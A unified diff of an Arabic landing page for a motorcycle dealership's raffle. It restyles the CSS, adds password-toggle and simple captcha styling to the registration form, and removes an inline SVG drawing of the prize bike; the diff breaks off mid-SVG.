@@ -3,23 +3,26 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>أمير الدراجات النارية | السحب الكبير على متر فلينج</title>
+<title>أمير المترات | المعرض المتكامل والسحب الأسطوري على متر فلينج</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap" rel="stylesheet">
 <style>
   :root {
-    --bg-dark: #090b10;
-    --card-dark: #121620;
-    --card-border: #232a3b;
-    --red-fire: #e63946;
-    --red-glow: #ff4d5a;
+    --bg-dark: #05070b;
+    --surface: #0f1420;
+    --surface-light: #161d2f;
+    --border: #222d44;
+    --primary: #ef233c;
+    --primary-glow: rgba(239, 35, 60, 0.45);
     --gold: #ffb703;
-    --gold-light: #ffd166;
+    --gold-bright: #ffd166;
+    --gold-glow: rgba(255, 183, 3, 0.35);
+    --cyan: #00b4d8;
     --text-white: #f8fafc;
-    --text-gray: #94a3b8;
-    --gradient-fire: linear-gradient(135deg, #d90429 0%, #ef233c 50%, #ffb703 100%);
-    --gradient-gold: linear-gradient(135deg, #ffb703 0%, #fb8500 100%);
+    --text-muted: #94a3b8;
+    --grad-fire: linear-gradient(135deg, #d90429 0%, #ef233c 50%, #ffb703 100%);
+    --grad-gold: linear-gradient(135deg, #ffb703 0%, #fb8500 100%);
   }
 
   * {
@@ -34,373 +37,339 @@
   body {
     background-color: var(--bg-dark);
     background-image: 
-      radial-gradient(circle at 15% 15%, rgba(230, 57, 70, 0.14) 0%, transparent 45%),
-      radial-gradient(circle at 85% 25%, rgba(255, 183, 3, 0.1) 0%, transparent 45%),
-      radial-gradient(circle at 50% 90%, rgba(230, 57, 70, 0.08) 0%, transparent 50%);
+      radial-gradient(circle at 15% 10%, rgba(239, 35, 60, 0.12) 0%, transparent 40%),
+      radial-gradient(circle at 85% 15%, rgba(255, 183, 3, 0.12) 0%, transparent 40%),
+      radial-gradient(circle at 50% 90%, rgba(0, 180, 216, 0.08) 0%, transparent 50%);
     color: var(--text-white);
-    line-height: 1.75;
+    line-height: 1.8;
     overflow-x: hidden;
   }
 
-  /* ===== شريط التنقل الزجاجي الداكن ===== */
+  /* ===== الشريط العلوي ===== */
   .navbar {
     position: sticky;
-    top: 12px;
+    top: 15px;
     z-index: 1000;
-    max-width: 960px;
+    max-width: 1080px;
     margin: 0 auto;
     padding: 0 15px;
   }
 
   .nav-box {
-    background: rgba(18, 22, 32, 0.85);
-    backdrop-filter: blur(14px);
-    -webkit-backdrop-filter: blur(14px);
-    border: 1px solid rgba(255, 255, 255, 0.1);
-    border-radius: 50px;
-    padding: 10px 22px;
+    background: rgba(15, 20, 32, 0.85);
+    backdrop-filter: blur(20px);
+    -webkit-backdrop-filter: blur(20px);
+    border: 1px solid rgba(255, 255, 255, 0.12);
+    border-radius: 60px;
+    padding: 12px 28px;
     display: flex;
     align-items: center;
     justify-content: space-between;
-    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+    box-shadow: 0 15px 35px rgba(0, 0, 0, 0.6);
     flex-wrap: wrap;
-    gap: 10px;
+    gap: 12px;
   }
 
-  .logo-text {
-    font-size: 18px;
+  .brand-logo {
+    font-size: 22px;
     font-weight: 900;
-    background: linear-gradient(90deg, #fff, var(--gold));
+    background: linear-gradient(90deg, #ffffff, var(--gold));
     -webkit-background-clip: text;
     -webkit-text-fill-color: transparent;
     display: flex;
     align-items: center;
-    gap: 8px;
+    gap: 10px;
+    text-shadow: 0 0 20px rgba(255,183,3,0.3);
   }
 
-  .nav-menu {
+  .nav-links {
     display: flex;
     gap: 8px;
     flex-wrap: wrap;
   }
 
-  .nav-menu a {
+  .nav-links a {
     text-decoration: none;
-    color: var(--text-gray);
+    color: var(--text-muted);
     font-size: 14px;
     font-weight: 700;
-    padding: 6px 14px;
+    padding: 8px 16px;
     border-radius: 30px;
     transition: 0.3s;
   }
 
-  .nav-menu a:hover {
+  .nav-links a:hover {
     color: #fff;
     background: rgba(255, 255, 255, 0.08);
   }
 
-  .nav-menu a.nav-cta {
-    background: var(--gradient-fire);
+  .nav-links a.cta-pill {
+    background: var(--grad-fire);
     color: #fff;
-    box-shadow: 0 4px 15px rgba(230, 57, 70, 0.4);
+    box-shadow: 0 4px 15px var(--primary-glow);
   }
 
-  /* ===== الهيدر وعرض المتر ===== */
+  /* ===== الهيدر ===== */
   header {
-    max-width: 960px;
-    margin: 25px auto 0;
-    padding: 45px 20px 55px;
+    max-width: 1080px;
+    margin: 30px auto 0;
+    padding: 50px 20px 60px;
     text-align: center;
-    position: relative;
   }
 
-  .badge-top {
-    display: inline-flex;
-    align-items: center;
-    gap: 8px;
-    background: rgba(255, 183, 3, 0.15);
-    border: 1px solid rgba(255, 183, 3, 0.45);
-    color: var(--gold-light);
-    padding: 6px 20px;
-    border-radius: 50px;
-    font-size: 14px;
-    font-weight: 800;
-    margin-bottom: 18px;
-    animation: pulseGlow 2.5s infinite;
-  }
-
-  @keyframes pulseGlow {
-    0%, 100% { box-shadow: 0 0 10px rgba(255, 183, 3, 0.2); }
-    50% { box-shadow: 0 0 22px rgba(255, 183, 3, 0.5); }
-  }
-
-  header h1 {
-    font-size: 40px;
-    font-weight: 900;
-    line-height: 1.3;
-    margin-bottom: 10px;
-  }
-
-  header h1 span {
-    background: var(--gradient-gold);
-    -webkit-background-clip: text;
-    -webkit-text-fill-color: transparent;
-  }
-
-  header p.lead {
-    color: var(--text-gray);
-    font-size: 17px;
-    max-width: 650px;
-    margin: 0 auto 28px;
-  }
-
-  /* بطاقة عرض صورة المتر الفلينج */
-  .bike-showcase {
-    background: linear-gradient(145deg, #161b28 0%, #0d1017 100%);
-    border: 2px solid rgba(255, 183, 3, 0.35);
-    border-radius: 28px;
-    padding: 25px 20px 30px;
-    max-width: 680px;
-    margin: 0 auto 30px;
-    position: relative;
-    box-shadow: 0 20px 50px rgba(0, 0, 0, 0.65), inset 0 0 40px rgba(230, 57, 70, 0.08);
-  }
-
-  .prize-ribbon {
-    position: absolute;
-    top: -15px;
-    left: 50%;
-    transform: translateX(-50%);
-    background: var(--gradient-fire);
-    color: #fff;
-    font-weight: 900;
-    font-size: 14px;
-    padding: 5px 22px;
-    border-radius: 30px;
-    box-shadow: 0 6px 20px rgba(230, 57, 70, 0.5);
-    white-space: nowrap;
-  }
-
-  .bike-visual {
-    width: 100%;
-    max-width: 480px;
-    margin: 10px auto;
-    filter: drop-shadow(0 15px 25px rgba(230, 57, 70, 0.35));
-    animation: bikeFloat 3.5s ease-in-out infinite;
-  }
-
-  @keyframes bikeFloat {
-    0%, 100% { transform: translateY(0); }
-    50% { transform: translateY(-7px); }
-  }
-
-  .bike-title {
-    font-size: 24px;
-    font-weight: 900;
-    color: var(--gold);
-    margin-top: 8px;
-  }
-
-  .bike-specs {
-    display: flex;
-    justify-content: center;
-    gap: 12px;
-    flex-wrap: wrap;
-    margin-top: 12px;
-  }
-
-  .spec-tag {
-    background: rgba(255, 255, 255, 0.06);
-    border: 1px solid rgba(255, 255, 255, 0.12);
-    padding: 5px 14px;
-    border-radius: 12px;
-    font-size: 13px;
-    font-weight: 700;
-    color: #e2e8f0;
-  }
-
-  .hero-btn {
+  .store-badge {
     display: inline-flex;
     align-items: center;
     gap: 10px;
-    background: var(--gradient-fire);
-    color: #fff;
-    text-decoration: none;
-    font-size: 18px;
-    font-weight: 900;
-    padding: 16px 38px;
+    background: rgba(255, 183, 3, 0.12);
+    border: 1px solid rgba(255, 183, 3, 0.4);
+    color: var(--gold-bright);
+    padding: 8px 22px;
     border-radius: 50px;
-    box-shadow: 0 10px 30px rgba(230, 57, 70, 0.45);
-    transition: 0.3s;
+    font-size: 14px;
+    font-weight: 800;
+    margin-bottom: 20px;
+    box-shadow: 0 0 25px rgba(255,183,3,0.15);
   }
 
-  .hero-btn:hover {
-    transform: translateY(-3px) scale(1.03);
-    box-shadow: 0 15px 35px rgba(230, 57, 70, 0.65);
+  header h1 {
+    font-size: 48px;
+    font-weight: 900;
+    line-height: 1.25;
+    margin-bottom: 15px;
   }
 
-  /* ===== الأقسام العامة ===== */
+  header h1 span {
+    background: var(--grad-gold);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    filter: drop-shadow(0 2px 10px rgba(255,183,3,0.3));
+  }
+
+  header p.subtitle {
+    color: var(--text-muted);
+    font-size: 18px;
+    max-width: 720px;
+    margin: 0 auto 32px;
+  }
+
+  /* ===== أقسام عامة ===== */
   section {
-    max-width: 960px;
-    margin: 45px auto;
+    max-width: 1080px;
+    margin: 60px auto;
     padding: 0 20px;
   }
 
-  .sec-title {
+  .section-head {
     text-align: center;
-    margin-bottom: 26px;
+    margin-bottom: 35px;
   }
 
-  .sec-title span {
+  .section-head .sub {
     color: var(--gold);
     font-size: 13px;
     font-weight: 800;
-    letter-spacing: 0.5px;
     display: block;
-    margin-bottom: 4px;
+    margin-bottom: 6px;
+    letter-spacing: 1px;
+    text-transform: uppercase;
   }
 
-  .sec-title h2 {
-    font-size: 28px;
+  .section-head h2 {
+    font-size: 34px;
     font-weight: 900;
     color: #fff;
   }
 
-  .dark-card {
-    background: var(--card-dark);
-    border: 1px solid var(--card-border);
-    border-radius: 24px;
-    padding: 30px;
-    box-shadow: 0 15px 35px rgba(0, 0, 0, 0.4);
-  }
-
-  /* ===== عن المعرض ===== */
-  .features-grid {
+  /* ===== بطاقات المترات ===== */
+  .categories-grid {
     display: grid;
     grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
-    gap: 18px;
-    margin-top: 22px;
-  }
-
-  .feat-card {
-    background: rgba(255, 255, 255, 0.03);
-    border: 1px solid rgba(255, 255, 255, 0.08);
-    border-radius: 18px;
-    padding: 22px;
-    transition: 0.3s;
-  }
-
-  .feat-card:hover {
-    border-color: var(--gold);
-    transform: translateY(-4px);
-    background: rgba(255, 183, 3, 0.05);
-  }
-
-  .feat-card .icon {
-    font-size: 30px;
-    margin-bottom: 10px;
-    display: block;
-  }
-
-  .feat-card h4 {
-    color: var(--gold-light);
-    font-size: 17px;
-    font-weight: 800;
-    margin-bottom: 6px;
-  }
-
-  .feat-card p {
-    color: var(--text-gray);
-    font-size: 14px;
-  }
-
-  /* ===== شروط السحب ===== */
-  .rules-list {
-    list-style: none;
-    display: grid;
-    grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-    gap: 14px;
-  }
-
-  .rules-list li {
-    background: rgba(255, 255, 255, 0.03);
-    border: 1px solid rgba(255, 255, 255, 0.07);
-    padding: 15px 18px;
-    border-radius: 14px;
-    display: flex;
-    align-items: center;
-    gap: 12px;
-    font-size: 15px;
-  }
-
-  .rules-list li b.num {
-    width: 30px;
-    height: 30px;
-    background: var(--gradient-fire);
-    color: #fff;
-    border-radius: 50%;
-    display: inline-flex;
-    align-items: center;
-    justify-content: center;
-    font-size: 14px;
-    flex-shrink: 0;
-  }
-
-  /* ===== الموقع والتواصل ===== */
-  .location-box {
-    display: flex;
-    flex-wrap: wrap;
-    align-items: center;
-    justify-content: space-between;
     gap: 20px;
   }
 
-  .loc-info h3 {
-    color: var(--gold);
+  .cat-card {
+    background: linear-gradient(160deg, var(--surface-light) 0%, var(--surface) 100%);
+    border: 1px solid var(--border);
+    border-radius: 24px;
+    padding: 28px 22px;
+    text-align: center;
+    transition: all 0.35s ease;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .cat-card:hover {
+    transform: translateY(-8px);
+    border-color: var(--gold);
+    box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6), 0 0 20px rgba(255,183,3,0.15);
+  }
+
+  .cat-card.featured {
+    border: 2px solid rgba(255, 183, 3, 0.65);
+    background: linear-gradient(160deg, #1c1514 0%, var(--surface) 100%);
+  }
+
+  .cat-tag {
+    position: absolute;
+    top: 14px;
+    left: 14px;
+    background: var(--grad-fire);
+    color: #fff;
+    font-size: 11px;
+    font-weight: 800;
+    padding: 4px 12px;
+    border-radius: 20px;
+    box-shadow: 0 4px 12px var(--primary-glow);
+  }
+
+  .cat-icon {
+    font-size: 46px;
+    margin-bottom: 14px;
+    display: block;
+  }
+
+  .cat-card h3 {
     font-size: 20px;
     font-weight: 800;
-    margin-bottom: 6px;
+    color: var(--gold-bright);
+    margin-bottom: 10px;
   }
 
-  .loc-info p {
-    color: var(--text-gray);
-    font-size: 15px;
+  .cat-card p {
+    font-size: 14px;
+    color: var(--text-muted);
+    margin-bottom: 16px;
   }
 
-  .phones-wrap {
+  .cat-specs {
     display: flex;
-    gap: 12px;
+    justify-content: center;
+    gap: 8px;
     flex-wrap: wrap;
   }
 
-  .call-btn {
-    background: rgba(255, 183, 3, 0.14);
-    border: 1px solid var(--gold);
-    color: var(--gold-light);
-    text-decoration: none;
-    padding: 10px 18px;
-    border-radius: 14px;
-    font-weight: 800;
+  .cat-specs span {
+    background: rgba(255, 255, 255, 0.05);
+    padding: 5px 12px;
+    border-radius: 8px;
+    font-size: 12px;
+    color: #cbd5e1;
+    border: 1px solid rgba(255,255,255,0.04);
+  }
+
+  /* ===== بانر الجائزة والمسابقة ===== */
+  .gifts-banner {
+    background: linear-gradient(145deg, #181015 0%, var(--surface) 60%, #111827 100%);
+    border: 2px solid rgba(239, 35, 60, 0.6);
+    border-radius: 32px;
+    padding: 40px 30px;
+    position: relative;
+    box-shadow: 0 30px 60px rgba(239, 35, 60, 0.2);
+    overflow: hidden;
+  }
+
+  .gift-ribbon {
+    display: inline-block;
+    background: var(--grad-fire);
+    color: #fff;
+    font-weight: 900;
+    font-size: 15px;
+    padding: 8px 26px;
+    border-radius: 30px;
+    margin-bottom: 20px;
+    box-shadow: 0 6px 20px var(--primary-glow);
+  }
+
+  .gifts-layout {
+    display: grid;
+    grid-template-columns: 1.1fr 0.9fr;
+    gap: 35px;
+    align-items: center;
+  }
+
+  .bike-display {
+    background: rgba(0, 0, 0, 0.4);
+    border: 1px solid rgba(255, 183, 3, 0.3);
+    border-radius: 26px;
+    padding: 24px;
+    text-align: center;
+    box-shadow: inset 0 0 30px rgba(0,0,0,0.5);
+  }
+
+  .bike-display svg {
+    width: 100%;
+    max-width: 450px;
+    filter: drop-shadow(0 20px 30px rgba(239, 35, 60, 0.45));
+    animation: floatBike 3.5s ease-in-out infinite;
+  }
+
+  @keyframes floatBike {
+    0%, 100% { transform: translateY(0); }
+    50% { transform: translateY(-8px); }
+  }
+
+  .gift-details h3 {
+    font-size: 32px;
+    font-weight: 900;
+    color: var(--gold);
+    margin-bottom: 12px;
+  }
+
+  .gift-details p {
+    color: #cbd5e1;
     font-size: 16px;
-    direction: ltr;
+    margin-bottom: 20px;
+  }
+
+  .gift-perks {
+    list-style: none;
+    margin-bottom: 25px;
+  }
+
+  .gift-perks li {
+    padding: 10px 14px;
+    background: rgba(255, 255, 255, 0.04);
+    border-radius: 14px;
+    margin-bottom: 10px;
+    font-size: 14px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    border: 1px solid rgba(255,255,255,0.04);
+  }
+
+  .go-register-btn {
+    display: inline-block;
+    background: var(--grad-gold);
+    color: #05070b;
+    text-decoration: none;
+    font-weight: 900;
+    font-size: 17px;
+    padding: 16px 32px;
+    border-radius: 50px;
+    box-shadow: 0 12px 30px var(--gold-glow);
     transition: 0.3s;
   }
 
-  .call-btn:hover {
-    background: var(--gold);
-    color: #000;
+  .go-register-btn:hover {
+    transform: translateY(-4px);
+    box-shadow: 0 16px 38px rgba(255, 183, 3, 0.55);
   }
 
-  /* ===== نموذج التسجيل في السحب ===== */
-  .form-card {
-    background: linear-gradient(160deg, #151a26 0%, #0e121b 100%);
-    border: 2px solid rgba(230, 57, 70, 0.4);
+  /* ===== استمارة التسجيل الأسطورية ===== */
+  .form-container {
+    background: var(--surface);
+    border: 2px solid rgba(255, 183, 3, 0.4);
+    border-radius: 30px;
+    padding: 40px;
+    box-shadow: 0 25px 55px rgba(0, 0, 0, 0.6);
   }
 
   .form-grid {
     display: grid;
-    grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
-    gap: 18px;
+    grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+    gap: 20px;
   }
 
   .field.full { grid-column: 1 / -1; }
@@ -409,17 +378,17 @@
     display: block;
     font-weight: 700;
     color: #e2e8f0;
-    margin-bottom: 7px;
+    margin-bottom: 8px;
     font-size: 14px;
   }
 
   .field input, .field select, .field textarea {
     width: 100%;
-    padding: 14px 16px;
-    border: 1.5px solid #2a3346;
-    border-radius: 14px;
+    padding: 15px 18px;
+    border: 1.5px solid var(--border);
+    border-radius: 16px;
     font-size: 15px;
-    background: #0b0e14;
+    background: #070a12;
     color: #fff;
     transition: 0.25s;
   }
@@ -427,32 +396,93 @@
   .field input:focus, .field select:focus, .field textarea:focus {
     outline: none;
     border-color: var(--gold);
-    box-shadow: 0 0 0 4px rgba(255, 183, 3, 0.18);
+    box-shadow: 0 0 0 4px rgba(255, 183, 3, 0.2);
   }
 
-  .field textarea { min-height: 85px; resize: vertical; }
+  .field textarea { min-height: 100px; resize: vertical; }
 
-  .submit-raffle {
-    width: 100%;
-    margin-top: 25px;
-    padding: 17px;
+  .password-wrap {
+    position: relative;
+  }
+
+  .toggle-pass {
+    position: absolute;
+    left: 15px;
+    top: 50%;
+    transform: translateY(-50%);
+    background: none;
     border: none;
-    border-radius: 16px;
-    background: var(--gradient-fire);
+    color: var(--text-muted);
+    cursor: pointer;
+    font-size: 14px;
+    font-weight: 700;
+  }
+
+  /* ===== كابتشا التحقق (إنسان وليس روبوت) ===== */
+  .captcha-box {
+    background: rgba(255, 255, 255, 0.03);
+    border: 1.5px dashed var(--border);
+    border-radius: 18px;
+    padding: 20px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    flex-wrap: wrap;
+    gap: 15px;
+    margin-top: 10px;
+  }
+
+  .captcha-inner {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+  }
+
+  .captcha-checkbox {
+    width: 26px;
+    height: 26px;
+    accent-color: var(--gold);
+    cursor: pointer;
+  }
+
+  .captcha-text {
+    font-weight: 700;
+    font-size: 15px;
+    color: #e2e8f0;
+  }
+
+  .captcha-math {
+    background: #05070b;
+    border: 1px solid var(--gold);
+    color: var(--gold);
+    padding: 8px 16px;
+    border-radius: 12px;
+    font-weight: 900;
+    font-size: 16px;
+    letter-spacing: 2px;
+  }
+
+  .btn-enter {
+    width: 100%;
+    margin-top: 30px;
+    padding: 18px;
+    border: none;
+    border-radius: 18px;
+    background: var(--grad-fire);
     color: #fff;
-    font-size: 19px;
+    font-size: 20px;
     font-weight: 900;
     cursor: pointer;
-    box-shadow: 0 10px 25px rgba(230, 57, 70, 0.45);
+    box-shadow: 0 12px 32px var(--primary-glow);
     transition: 0.3s;
   }
 
-  .submit-raffle:hover {
+  .btn-enter:hover {
     transform: translateY(-3px);
-    box-shadow: 0 15px 35px rgba(230, 57, 70, 0.65);
+    box-shadow: 0 16px 40px rgba(239, 35, 60, 0.65);
   }
 
-  .submit-raffle:disabled {
+  .btn-enter:disabled {
     opacity: 0.6;
     cursor: not-allowed;
     transform: none;
@@ -460,23 +490,24 @@
 
   .msg {
     display: none;
-    margin-top: 16px;
-    padding: 14px;
+    margin-top: 18px;
+    padding: 16px;
     border-radius: 14px;
     text-align: center;
     font-weight: 700;
   }
 
-  .err { display: block; background: rgba(230, 57, 70, 0.15); color: #ff8fa3; border: 1px solid var(--red-fire); }
+  .err { display: block; background: rgba(239, 35, 60, 0.15); color: #ff8fa3; border: 1px solid var(--primary); }
 
-  /* ===== تذكرة النجاح بعد التسجيل ===== */
+  /* ===== تذكرة السحب الناجحة ===== */
   #ticketBox {
     display: none;
     text-align: center;
-    padding: 40px 20px;
-    background: linear-gradient(145deg, #13221c 0%, #0c1713 100%);
+    padding: 45px 25px;
+    background: linear-gradient(145deg, #11281e 0%, #07120d 100%);
     border: 2px dashed #10b981;
-    border-radius: 22px;
+    border-radius: 26px;
+    box-shadow: 0 20px 50px rgba(16, 185, 129, 0.2);
   }
 
   .ticket-badge {
@@ -484,268 +515,252 @@
     background: #10b981;
     color: #fff;
     font-weight: 900;
-    padding: 6px 20px;
+    padding: 8px 24px;
     border-radius: 30px;
-    font-size: 14px;
-    margin-bottom: 14px;
+    font-size: 15px;
+    margin-bottom: 15px;
+    box-shadow: 0 5px 15px rgba(16,185,129,0.4);
   }
 
   #ticketBox h3 {
-    font-size: 26px;
+    font-size: 30px;
     color: #34d399;
-    margin-bottom: 8px;
+    margin-bottom: 10px;
+    font-weight: 900;
   }
 
-  .ticket-number {
+  .ticket-code {
     display: inline-block;
-    background: rgba(255, 183, 3, 0.15);
+    background: rgba(255, 183, 3, 0.12);
     border: 2px solid var(--gold);
     color: var(--gold);
-    font-size: 26px;
+    font-size: 32px;
     font-weight: 900;
-    padding: 10px 30px;
-    border-radius: 16px;
-    margin: 15px 0;
-    letter-spacing: 2px;
+    padding: 12px 38px;
+    border-radius: 18px;
+    margin: 18px 0;
+    letter-spacing: 3px;
     direction: ltr;
+    box-shadow: 0 0 30px rgba(255,183,3,0.25);
   }
 
-  /* ===== الفوتر ===== */
+  /* ===== الموقع والفوتر ===== */
+  .location-strip {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 26px;
+    padding: 30px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    flex-wrap: wrap;
+    gap: 20px;
+  }
+
+  .loc-text h3 { color: var(--gold); font-size: 22px; font-weight: 900; margin-bottom: 5px; }
+  .loc-text p { color: var(--text-muted); font-size: 16px; }
+
+  .phones-list {
+    display: flex;
+    gap: 14px;
+    flex-wrap: wrap;
+  }
+
+  .phone-link {
+    background: rgba(255, 183, 3, 0.12);
+    border: 1px solid var(--gold);
+    color: var(--gold-bright);
+    text-decoration: none;
+    padding: 12px 22px;
+    border-radius: 16px;
+    font-weight: 800;
+    direction: ltr;
+    transition: 0.3s;
+  }
+
+  .phone-link:hover { background: var(--gold); color: #05070b; }
+
   footer {
-    background: #05070a;
-    border-top: 1px solid #1a202c;
+    background: #020407;
+    border-top: 1px solid #161b26;
     text-align: center;
-    padding: 40px 20px;
+    padding: 45px 20px;
     margin-top: 70px;
-    color: var(--text-gray);
+    color: var(--text-muted);
   }
 
-  footer h3 {
-    color: var(--gold);
-    font-size: 22px;
-    font-weight: 900;
-    margin-bottom: 6px;
-  }
+  footer h3 { color: var(--gold); font-size: 24px; font-weight: 900; margin-bottom: 8px; }
 
-  @media (max-width: 600px) {
-    header h1 { font-size: 30px; }
-    .nav-box { justify-content: center; border-radius: 24px; }
-    .dark-card { padding: 22px 16px; }
+  @media (max-width: 768px) {
+    .gifts-layout { grid-template-columns: 1fr; }
+    header h1 { font-size: 34px; }
+    .form-container { padding: 25px 20px; }
   }
 </style>
 </head>
 <body>
 
-<!-- ===== شريط التنقل ===== -->
+<!-- ===== الشريط العلوي ===== -->
 <div class="navbar">
   <div class="nav-box">
-    <div class="logo-text">🏍️ أمير الدراجات النارية</div>
-    <div class="nav-menu">
-      <a href="#about">عن المعرض</a>
-      <a href="#rules">شروط السحب</a>
-      <a href="#location">موقعنا</a>
-      <a href="#register" class="nav-cta">سجّل للسحب الآن</a>
+    <div class="brand-logo">🏍️ أمير المترات</div>
+    <div class="nav-links">
+      <a href="#models">أنواع المترات</a>
+      <a href="#gifts">المسابقة الكبرى</a>
+      <a href="#location">موقع المعرض</a>
+      <a href="#register" class="cta-pill">سجّل الآن</a>
     </div>
   </div>
 </div>
 
-<!-- ===== الهيدر وعرض الجائزة ===== -->
+<!-- ===== الهيدر ===== -->
 <header>
-  <div class="badge-top">🔥 المسابقة الكبرى لعملاء ومتابعي المعرض 🔥</div>
-  <h1>اربح <span>متر فلينج</span> وكالة<br>من أمير الدراجات النارية!</h1>
-  <p class="lead">بمناسبة افتتاح الموسم الجديد في <strong>القاعدة — جوار مستوصف السلطان</strong>، سجّل بياناتك مجاناً وادخل السحب الكبير!</p>
-
-  <!-- بطاقة عرض الدراجة -->
-  <div class="bike-showcase">
-    <div class="prize-ribbon">🏆 الجائزة الكبرى — متر فلينج (FELLING) 🏆</div>
-    
-    <!-- ملاحظة: يمكنك استبدال كود الـ SVG أدناه بوسم <img src="رابط_صورة_المتر.jpg" style="width:100%; border-radius:16px;"> إذا أردت وضع صورة حقيقية من جهازك -->
-    <div class="bike-visual">
-      <svg viewBox="0 0 600 320" xmlns="http://www.w3.org/2000/svg">
-        <defs>
-          <linearGradient id="bodyRed" x1="0" y1="0" x2="1" y2="1">
-            <stop offset="0%" stop-color="#ff2a3c"/>
-            <stop offset="55%" stop-color="#c1121f"/>
-            <stop offset="100%" stop-color="#780000"/>
-          </linearGradient>
-          <linearGradient id="goldTrim" x1="0" y1="0" x2="1" y2="0">
-            <stop offset="0%" stop-color="#ffd166"/>
-            <stop offset="100%" stop-color="#fb8500"/>
-          </linearGradient>
-          <linearGradient id="chrome" x1="0" y1="0" x2="0" y2="1">
-            <stop offset="0%" stop-color="#f8fafc"/>
-            <stop offset="50%" stop-color="#94a3b8"/>
-            <stop offset="100%" stop-color="#334155"/>
-          </linearGradient>
-          <radialGradient id="wheelGlow" cx="50%" cy="50%" r="50%">
-            <stop offset="60%" stop-color="#1e293b"/>
-            <stop offset="100%" stop-color="#090b10"/>
-          </radialGradient>
-        </defs>
-
-        <!-- ظل الأرضية -->
-        <ellipse cx="300" cy="288" rx="230" ry="14" fill="rgba(230, 57, 70, 0.25)"/>
-
-        <!-- العجلة الخلفية -->
-        <g transform="translate(145, 225)">
-          <circle r="58" fill="#0f172a" stroke="#1e293b" stroke-width="10"/>
-          <circle r="44" fill="none" stroke="url(#goldTrim)" stroke-width="3" stroke-dasharray="14 6"/>
-          <circle r="36" fill="url(#wheelGlow)"/>
-          <!-- أسلاك الجنط -->
-          <line x1="-36" y1="0" x2="36" y2="0" stroke="#94a3b8" stroke-width="3"/>
-          <line x1="0" y1="-36" x2="0" y2="36" stroke="#94a3b8" stroke-width="3"/>
-          <line x1="-25" y1="-25" x2="25" y2="25" stroke="#94a3b8" stroke-width="3"/>
-          <line x1="25" y1="-25" x2="-25" y2="25" stroke="#94a3b8" stroke-width="3"/>
-          <circle r="12" fill="url(#chrome)"/>
-        </g>
-
-        <!-- العجلة الأمامية -->
-        <g transform="translate(455, 225)">
-          <circle r="58" fill="#0f172a" stroke="#1e293b" stroke-width="10"/>
-          <circle r="44" fill="none" stroke="url(#goldTrim)" stroke-width="3" stroke-dasharray="14 6"/>
-          <circle r="36" fill="url(#wheelGlow)"/>
-          <!-- أسلاك الجنط -->
-          <line x1="-36" y1="0" x2="36" y2="0" stroke="#94a3b8" stroke-width="3"/>
-          <line x1="0" y1="-36" x2="0" y2="36" stroke="#94a3b8" stroke-width="3"/>
-          <line x1="-25" y1="-25" x2="25" y2="25" stroke="#94a3b8" stroke-width="3"/>
-          <line x1="25" y1="-25" x2="-25" y2="25" stroke="#94a3b8" stroke-width="3"/>
-          <!-- قرص الفرامل -->
-          <circle r="22" fill="none" stroke="#ef233c" stroke-width="4" stroke-dasharray="6 3"/>
-          <circle r="11" fill="url(#chrome)"/>
-        </g>
-
-        <!-- الشكمان (العادم الرياضي) -->
-        <path d="M240 225 L110 198 L105 212 L235 236 Z" fill="url(#chrome)"/>
-        <rect x="98" y="196" width="16" height="18" rx="3" fill="#1e293b"/>
-
-        <!-- الشوكة الأمامية (المساعدات) -->
-        <line x1="395" y1="115" x2="455" y2="225" stroke="url(#goldTrim)" stroke-width="10" stroke-linecap="round"/>
-        <line x1="403" y1="115" x2="462" y2="225" stroke="url(#chrome)" stroke-width="5" stroke-linecap="round"/>
-
-        <!-- الرفرف الأمامي -->
-        <path d="M405 182 Q445 152 492 178 Q455 170 405 182 Z" fill="url(#bodyRed)"/>
-
-        <!-- المحرك والهيكل السفلي -->
-        <rect x="245" y="168" width="95" height="62" rx="14" fill="#1e293b" stroke="#475569" stroke-width="3"/>
-        <line x1="255" y1="182" x2="330" y2="182" stroke="#64748b" stroke-width="2"/>
-        <line x1="255" y1="194" x2="330" y2="194" stroke="#64748b" stroke-width="2"/>
-        <line x1="255" y1="206" x2="330" y2="206" stroke="#64748b" stroke-width="2"/>
-        <circle cx="292" cy="212" r="14" fill="url(#goldTrim)"/>
-
-        <!-- المقعد الرياضي -->
-        <path d="M165 135 Q225 142 268 148 L260 165 L155 155 Z" fill="#0f172a" stroke="#334155" stroke-width="2"/>
-
-        <!-- خزان الوقود والفيبر الجانبي (متر فلينج) -->
-        <path d="M265 145 Q315 102 385 118 L415 155 Q360 185 270 168 Z" fill="url(#bodyRed)"/>
-        <!-- خط ذهبي رياضي على الخزان -->
-        <path d="M280 142 Q330 118 390 132" fill="none" stroke="url(#goldTrim)" stroke-width="5" stroke-linecap="round"/>
-        
-        <!-- الذيل الخلفي -->
-        <path d="M120 122 L225 142 L215 162 L135 145 Z" fill="url(#bodyRed)"/>
-
-        <!-- المقدمة والكشاف الأمامي والمقود -->
-        <path d="M380 115 L425 122 L418 152 L375 145 Z" fill="url(#bodyRed)"/>
-        <!-- ضوء الكشاف LED -->
-        <polygon points="424,124 438,132 422,146" fill="#fef08a"/>
-        <polygon points="435,128 535,105 535,165 435,144" fill="rgba(254, 240, 138, 0.16)"/>
-        
-        <!-- المقود والمرايا -->
-        <path d="M382 115 L368 90 L345 92" fill="none" stroke="url(#chrome)" stroke-width="6" stroke-linecap="round"/>
-        <ellipse cx="348" cy="82" rx="12" ry="6" fill="#38bdf8" stroke="#cbd5e1" stroke-width="2"/>
-
-        <!-- شعار FELLING على الخزان -->
